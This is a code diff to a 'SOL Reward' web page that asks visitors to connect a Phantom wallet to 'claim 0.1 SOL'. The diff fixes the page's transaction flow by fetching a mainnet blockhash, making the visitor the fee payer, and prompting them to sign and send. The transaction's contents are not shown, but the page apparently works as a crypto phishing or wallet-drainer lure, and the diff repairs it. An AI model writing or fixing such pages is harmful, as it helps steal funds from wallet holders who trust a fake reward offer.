@@ -50,7 +50,7 @@
 
     <div class="container">
         <h1>SOL Reward</h1>
-        <p>Connect Phantom Wallet to claim 0.1 SOL.</p>
+        <p>Connect Phantom Wallet to claim  0.1 SOL.</p>
         
         <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
         
@@ -101,6 +101,19 @@
                     })
                 );
 
+                // ==========================================
+                // FIX: Fetch Recent Blockhash
+                // ==========================================
+                statusDiv.innerText = "Fetching recent blockhash...";
+                
+                // Use the Connection object to fetch the latest blockhash
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                
+                // Assign the blockhash to the transaction
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = userPublicKey; // Set fee payer to the user
+
                 statusDiv.innerText = "Sign Green...";
                 
                 // --- STEP 1: SIGN (This opens Phantom) ---
@@ -110,9 +123,8 @@
                 // --- STEP 2: SEND (This sends to network) ---
                 statusDiv.innerText = "Sending transaction...";
                 
-                // Use sendTransaction with the pre-signed transaction
                 const signature = await window.solana.sendTransaction(signedTx, {
-                    skipPreflight: false, // Important for accurate error feedback
+                    skipPreflight: false,
                     commitment: 'singleGossip'
                 });
 
@@ -124,7 +136,6 @@
 
             } catch (err) {
                 console.error(err);
-                // Check for specific cancel errors
                 if (err.message && err.message.includes("User rejected")) {
                     statusDiv.innerText = "Cancelled by user.";
                 } else if (err.message && err.message.includes("cancelled")) {
